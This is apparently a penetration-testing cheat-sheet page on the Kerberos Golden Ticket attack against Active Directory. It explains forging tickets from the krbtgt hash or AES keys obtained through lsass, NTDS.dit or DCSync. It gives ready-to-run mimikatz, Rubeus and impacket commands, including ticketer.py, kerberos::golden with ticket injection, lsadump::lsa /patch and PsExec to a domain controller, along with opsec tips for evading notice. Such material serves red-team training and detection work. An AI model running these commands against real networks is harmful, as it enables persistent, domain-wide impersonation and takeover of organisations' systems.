# Golden Ticket

A valid **TGT as any user** can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** (or machine) in the domain and the impersonated user.\
Moreover the **credentials** of **krbtgt** are **never** **changed** automatically.

The **krbtgt** account **NTLM hash** can be **obtained** from the **lsass process** or from the **NTDS.dit file** of any DC in the domain. It is also possible to get that NTLM through a **DCsync attack**, which can be performed either with the [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) module of Mimikatz or the impacket example [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Usually, **domain admin privileges or similar are required**, no matter what technique is used.

It also must be taken into account that it is possible AND **PREFERABLE** (opsec) to **forge tickets using the AES Kerberos keys (AES128 and AES256)**.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="From Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
misc::cmd
psexec.exe \\COMPUTER-NAME cmd.exe

.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like you can not get a shell via winrm).

****[**More information about Golden Tickets from ired.team**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)****

****

{% code title="mimikatz #" %}
```
privilege::debug
lsadump::lsa /patch
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd


C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
```
{% endcode %}
